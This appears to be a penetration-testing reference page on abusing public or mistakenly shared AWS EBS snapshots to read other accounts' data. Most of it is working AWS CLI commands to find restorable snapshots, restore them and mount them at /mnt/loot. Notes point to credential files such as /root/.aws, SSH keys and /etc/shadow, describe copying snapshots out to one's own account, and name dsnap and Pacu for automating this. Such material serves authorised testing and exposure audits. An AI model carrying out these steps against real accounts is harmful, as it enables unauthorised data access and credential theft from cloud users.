---
title: "EBS snapshots: restoring public or shared block-storage snapshots"
description: "Finding public or shared EBS snapshots and restoring them to read volumes you were never granted."
keywords:
  - EBS
  - snapshot
  - public
  - volume
  - data recovery
---

# EBS snapshots

An EBS snapshot is a point-in-time copy of a volume, and its sharing setting is separate from the volume's. Snapshots are frequently left **public** or shared to a specific account by mistake, which exposes the entire filesystem (credentials, keys, databases) to anyone who can restore them. The attack is to find a snapshot you can access, create a volume from it, and mount that volume on an instance you control.

## Finding accessible snapshots

```bash
# snapshots explicitly shared with you or public, not owned by you
aws ec2 describe-snapshots --restorable-by-user-ids self \
  --query 'Snapshots[?OwnerId!=`<your-acct>`].[SnapshotId,VolumeSize,Description]'

# a specific owner's snapshots, if you know the target account id
aws ec2 describe-snapshots --owner-ids <target-acct>
```

## Restoring and mounting

```bash
# create a volume from the snapshot in your AZ, attach to your instance
aws ec2 create-volume --snapshot-id snap-xxxx --availability-zone us-east-1a
aws ec2 attach-volume --volume-id vol-xxxx --instance-id i-your --device /dev/sdf
# on the instance
sudo mkdir /mnt/loot && sudo mount /dev/xvdf1 /mnt/loot
```

## Exploitation notes

- Public snapshots are discoverable account-wide; dsnap and Pacu automate finding and pulling them without standing up an instance by hand.
- Mount read-only to avoid altering timestamps, and look first for `/root/.aws`, `/home/*/.ssh`, `/etc/shadow`, and application config with embedded secrets.
- A snapshot you can *share* (`ModifySnapshotAttribute`) can be exfiltrated to your own account even when you cannot mount it in place.

## Tools

- **dsnap**: download and mount EBS snapshots for offline analysis.
- **Pacu** (`ebs__enum_volumes_snapshots`, `ebs__download_snapshot`): discover and pull snapshots.
- **AWS CLI** (`create-volume`, `attach-volume`): manual restore.

## References

- [HackTricks Cloud: EBS snapshots](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-ssm-and-vpc.html)
- [dsnap (RhinoSecurityLabs)](https://github.com/RhinoSecurityLabs/dsnap)
